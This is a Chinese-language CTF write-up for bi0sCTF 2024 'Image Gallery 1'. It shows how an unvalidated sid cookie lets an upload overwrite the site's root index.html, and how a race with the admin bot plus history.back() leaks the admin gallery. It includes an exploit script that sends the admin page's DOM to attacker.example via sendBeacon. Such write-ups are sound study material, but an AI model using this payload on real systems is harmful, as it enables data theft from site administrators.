# bi0sCTF 2024 - Image Gallery 1

## 题目简述

服务为每个访客设置一个 UUID 形式的 `sid` Cookie，并把上传文件放入 `public/<sid>/`。管理员目录中预先存在 `flag.txt`；分享功能让带有管理员 `sid` 的 Puppeteer 先访问管理员图库，再访问 `/?f=<被分享 URL>`。

漏洞在于上传接口直接把 Cookie 当作目录名，却没有复用首页对 UUID 的校验。令 `sid=.` 后上传 `index.html`，实际写入位置会变成静态目录根部的 `public/index.html`。Express 的静态中间件注册在 `/` 路由之前，此后访问根路径会优先执行攻击者页面。结合管理员浏览历史，即可读回先前渲染过的管理员图库 DOM。

## 解题过程

### 覆盖静态目录入口

首页只在读取图库时校验 `sid` 是否为 UUID，但上传接口仅检查 Cookie 是否存在：

```javascript
app.post("/upload", async (req, res) => {
  const uploadedFile = req.files.image;
  await uploadedFile.mv(`./public/${req.cookies.sid}/${uploadedFile.name}`);
  res.redirect("/");
});
```

因此可自行设置：

```text
Cookie: sid=.
```

随后把恶意 HTML 作为文件名 `index.html` 上传。拼接后的路径为 `./public/./index.html`，也就是整个站点的静态首页，而不是某个用户的图库文件。该文件一旦存在，`express.static('public')` 会在动态 `/` 路由之前响应 `/` 及带查询参数的根路径。

### 利用管理员的两段浏览历史

管理员机器人执行顺序是：

1. 设置管理员 `sid`；
2. 访问 `/`，此时动态页面列出管理员目录中的 `flag.txt`；
3. 等待约 3 秒；
4. 访问 `/?f=<分享参数>`；
5. 再等待约 3 秒。

应先触发 `/share`，让机器人完成第一步页面加载，再在它等待期间上传根目录 `index.html`。这样第二次导航会命中恶意静态页，而浏览历史中的上一项仍是包含 flag 文件名的管理员图库。

官方利用页用一个新窗口完成历史回退和同源读取：

```html
<script>
(async () => {
  if (opener) {
    opener.history.back();
    await new Promise(resolve => setTimeout(resolve, 2000));
    navigator.sendBeacon(
      "https://attacker.example/collect",
      opener.document.body.innerHTML
    );
  } else {
    window.open("/?probe");
  }
})();
</script>
```

顶层恶意页没有 `opener`，于是打开同源子窗口。子窗口也加载同一个恶意首页，但它持有对父窗口的引用；它让父窗口 `history.back()` 回到管理员图库。两个窗口同源，所以等待页面恢复后可以读取 `opener.document.body.innerHTML`。回传内容包含管理员目录中 `flag.txt` 的路径，继续请求该静态文件即可得到 flag。

实际复现时要把触发分享和上传根首页安排成竞态：上传太早会使机器人的第一次访问也落到恶意页，历史中便没有管理员图库；上传太晚则第二次导航仍会进入正常 EJS 页面。

## 方法总结

本题的核心是“Cookie 作为文件系统路径”与“静态中间件优先级”的组合。`sid` 在一个路由中被当作 UUID，在另一个路由中却完全受用户控制，导致用户文件覆盖站点根入口。管理员先后两次访问同源站点又提供了可回退的敏感历史项，最终通过 `window.open`、`history.back()` 和同源 DOM 访问把管理员图库内容带出。
